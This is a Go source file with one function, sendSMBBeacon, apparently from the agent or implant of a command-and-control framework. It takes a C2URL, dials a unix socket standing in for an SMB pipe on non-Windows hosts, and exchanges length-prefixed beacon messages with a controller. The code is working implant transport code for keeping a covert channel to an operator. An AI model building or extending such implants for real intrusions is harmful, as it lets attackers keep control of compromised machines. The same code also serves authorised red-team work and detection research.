//go:build !windows
// +build !windows

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"time"
)

func sendSMBBeacon(body []byte) []byte {
	socketPath := strings.TrimPrefix(C2URL, "smb://")
	conn, err := net.Dial("unix", socketPath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] SMB unix socket dial to %s failed: %v\n", socketPath, err)
		}
		return nil
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var msgLen uint32
	if err := binary.Read(conn, binary.BigEndian, &msgLen); err != nil {
		return nil
	}
	if msgLen == 0 || msgLen > 16*1024*1024 {
		return nil
	}

	resp := make([]byte, msgLen)
	if _, err := conn.Read(resp); err != nil {
		return nil
	}
	return resp
}